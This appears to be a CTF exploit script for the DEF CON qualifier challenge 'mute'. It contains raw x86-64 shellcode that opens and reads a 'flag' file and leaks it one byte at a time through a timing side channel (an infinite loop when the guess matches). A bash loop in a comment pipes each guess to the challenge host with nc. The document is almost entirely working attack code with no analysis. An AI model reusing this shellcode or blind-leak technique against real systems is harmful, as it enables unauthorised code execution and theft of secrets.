import sys
import string
from struct import *
p32 = lambda x : pack("<L" , x)
            
shellcode = "\x68\x66\x6C\x61\x67\x54\x5F\x48\x31\xF6\x48\x31\xD2\x6A\x02\x58\x0F\x05\x50\x5F\x68\x0E\x12\x60\x00\x5E\x68\x00\x01\x00\x00\x5A\x48\x31\xC0\x0F\x05\x68\x0E\x12\x60\x00\x5A\x48\x83\xC2"
shellcode += "\x72"          #manual
shellcode += "\x8A\x02\xB2"
shellcode += p32(int(sys.argv[1]))[0]
shellcode += "\x38\xD0\x75\x05\x90\x90\x90\xEB\xFB\x90"
	

sys.stdout.write(shellcode.ljust(4096,"\xff"))

"""
#! /bin/bash

for i in {126..0}
do
	echo $i
	A=`python test.py $i > test`
	A=`cat test | (nc mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me 443)`
done
"""